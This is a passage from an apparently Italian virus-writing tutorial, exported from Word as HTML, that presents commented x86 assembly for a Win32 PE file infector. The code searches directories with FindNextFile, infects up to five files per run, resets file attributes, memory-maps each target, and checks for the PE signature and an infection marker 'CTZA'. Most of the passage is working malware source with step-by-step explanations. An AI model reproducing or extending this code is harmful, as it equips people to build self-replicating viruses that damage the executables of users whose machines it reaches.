la quale abbiamo bisogno solo dellaWFD. Ad ogni infezione incrementiamo il
contatore <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; e controlliamo
se abbiamo già infettato 5 files. Se sì, usciamo dalla procedura infettiva.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;----------------------------------------------------------------------------------------------------------------<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>__2:<span
style="mso-spacerun: yes">    </span>lea<span style="mso-spacerun: yes">    
</span>edi,[ebp+WFD_szFileName]<span style="mso-spacerun: yes">        </span>;
Ptr al nome del file <o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span></span></b><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>mov<span style="mso-spacerun: yes">    
</span>ecx,MAX_PATH<span style="mso-spacerun: yes">                    </span>;
ECX = 260<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span></span></b><b
style='mso-bidi-font-weight:normal'><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>xor<span style="mso-spacerun: yes">     </span>al,al<span
style="mso-spacerun: yes">                        </span><span
style="mso-spacerun: yes">   </span>; AL = 00<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>rep<span style="mso-spacerun:
yes">     </span>stosb<span style="mso-spacerun:
yes">                           </span>; pulisce il vecchio nome<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span></span></b><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>lea<span style="mso-spacerun: yes">    
</span>eax,[ebp+offset WIN32_FIND_DATA] ; Ptr a WFD<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>push<span style="mso-spacerun: yes">    </span>eax<span
style="mso-spacerun: yes">                             </span>; lo pusha<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>push<span style="mso-spacerun: yes">    </span>dword ptr
[ebp+SearchHandle]<span style="mso-spacerun: yes">    </span>; Pusha l’Handle
di ricerca<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>call<span style="mso-spacerun: yes">    </span>[ebp+_FindNextFileA]<span
style="mso-spacerun: yes">            </span>; trova un’altro file<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span>or<span
style="mso-spacerun: yes">      </span>eax,eax<span style="mso-spacerun:
yes">                         </span>; errore? <o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span></span></b><b
style='mso-bidi-font-weight:normal'><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>jnz<span style="mso-spacerun: yes">     </span>__1<span
style="mso-spacerun: yes">                             </span>; No, Infetta
ancora<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>CloseSearchHandle:<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span>push<span
style="mso-spacerun: yes">    </span>dword ptr [ebp+SearchHandle]<span
style="mso-spacerun: yes">    </span>; Pusha l’handle di ricerca<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>call<span style="mso-spacerun: yes">    </span>[ebp+_FindClose]<span
style="mso-spacerun: yes">                </span>; chiudi<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>FailInfect:<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>ret<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;----------------------------------------------------------------------------------------------------------------<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; TROVA IL
PROSSIMO FILE DELLA DIR. PRESCELTA<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; Il primo blocco
di codice cancella i dati nella struttura WFD (i dati del nome del file), per
evitare problemi durante la ricerca <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; di un altro
file. Quindi chiamiamo l’API FindNextFile.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;----------------------------------------------------------------------------------------------------------------</span><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF'><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>Infection:<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>lea<span style="mso-spacerun:
yes">     </span>esi,[ebp+WFD_szFileName]<span style="mso-spacerun:
yes">        </span>; trova iul file da infettare<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span></span></b><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>push<span style="mso-spacerun: yes">    </span>80h<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>push<span style="mso-spacerun: yes">    </span>esi<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span></span></b><b
style='mso-bidi-font-weight:normal'><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>call<span style="mso-spacerun: yes">    </span>[ebp+_SetFileAttributesA]<span
style="mso-spacerun: yes">       </span>; ci servono gli attributes<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>call<span style="mso-spacerun:
yes">    </span>OpenFile<span style="mso-spacerun: yes">                       
</span>; lo apre<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>inc<span style="mso-spacerun:
yes">     </span>eax<span style="mso-spacerun:
yes">                             </span>; se EAX = -1, c’è un errore<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span></span></b><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>jz<span style="mso-spacerun: yes">     
</span>CantOpen<span style="mso-spacerun: yes">                        </span>;
<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>dec<span style="mso-spacerun: yes">    </span><span style="mso-spacerun:
yes"> </span>eax<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>mov<span style="mso-spacerun: yes">     </span>dword ptr
[ebp+FileHandle],eax<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;----------------------------------------------------------------------------------------------------------------<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; 9) INFEZIONE:
APRE IL FILE<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;<span
style="mso-spacerun: yes">  </span>Qui vengono settati gli attributi del file a
&quot;Normal file&quot; attraverso al funzione API SetFileAttributes <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;----------------------------------------------------------------------------------------------------------------</span><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF'><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>mov<span style="mso-spacerun:
yes">     </span>ecx,dword ptr [ebp+WFD_nFileSizeLow] ; crea una mappa della <o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>call<span style="mso-spacerun:
yes">    </span>CreateMap<span style="mso-spacerun:
yes">                            </span>; misura esatta<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span></span></b><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>or<span style="mso-spacerun: yes">      </span>eax,eax<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span>jz<span
style="mso-spacerun: yes">      </span>CloseFile<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>mov<span style="mso-spacerun: yes">     </span>dword ptr
[ebp+MapHandle],eax<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>mov<span style="mso-spacerun: yes">     </span>ecx,dword ptr
[ebp+WFD_nFileSizeLow] <o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span></span></b><b
style='mso-bidi-font-weight:normal'><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>call<span style="mso-spacerun: yes">    </span>MapFile<span
style="mso-spacerun: yes">                           </span><span
style="mso-spacerun: yes">   </span>; Mappa il file<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span></span></b><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>or<span style="mso-spacerun: yes">      </span>eax,eax<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span>jz<span
style="mso-spacerun: yes">      </span>UnMapFile<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>mov<span style="mso-spacerun: yes">     </span>dword ptr
[ebp+MapAddress],eax<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;----------------------------------------------------------------------------------------------------------------<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; MAPPA IL FILE<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; Mettiamo in ECX
la misura del file che stiamo per mappare, quindi chiamiamo la funzione<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; per creare la
mappatura del file. Controlliamo i possibili errori. Se non ci sono,
continuiamo, <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;altrimenti
chiudiamo il file. Quindi salviamo l’handle di mappatura (mapping handle) e ci
prepariamo a mapapre il <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; file con la
funzione MapFile. Come prima, controlliamo i possibili errori. Se tutto è ok,
salviamo <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; l’indirizzo di
mappatura<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;----------------------------------------------------------------------------------------------------------------</span><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF'><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>mov<span style="mso-spacerun:
yes">     </span>esi,[eax+3Ch]<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>add<span style="mso-spacerun:
yes">     </span>esi,eax<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>cmp<span style="mso-spacerun:
yes">     </span>dword ptr [esi],&quot;EP&quot;<span style="mso-spacerun:
yes">            </span>; E’ un formato PE?<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>jnz<span style="mso-spacerun:
yes">     </span>NoInfect<span style="mso-spacerun:
yes">                        </span>; ricorda INTEL memorizza alla rovescia<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes"> </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">       </span><span style="mso-spacerun:
yes"> </span>cmp<span style="mso-spacerun: yes">     </span>dword ptr
[esi+4Ch],&quot;CTZA&quot;<span style="mso-spacerun: yes">      </span>; è già
infettato ?<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>jz<span style="mso-spacerun:
yes">      </span>NoInfect<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>push<span style="mso-spacerun:
yes">    </span>dword ptr [esi+3Ch]<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>push<span style="mso-spacerun:
yes">    </span>dword ptr [ebp+MapAddress]<span style="mso-spacerun: yes">     
</span>; chiude tutto<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span></span></b><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>call<span style="mso-spacerun: yes">   
</span>[ebp+_UnmapViewOfFile]<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>push<span style="mso-spacerun: yes">    </span>dword ptr [ebp+MapHandle]<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>call<span style="mso-spacerun: yes">    </span>[ebp+_CloseHandle]<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span></span></b><b
style='mso-bidi-font-weight:normal'><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>pop<span style="mso-spacerun: yes">     </span>ecx<o:p></o:p></span></b></p>

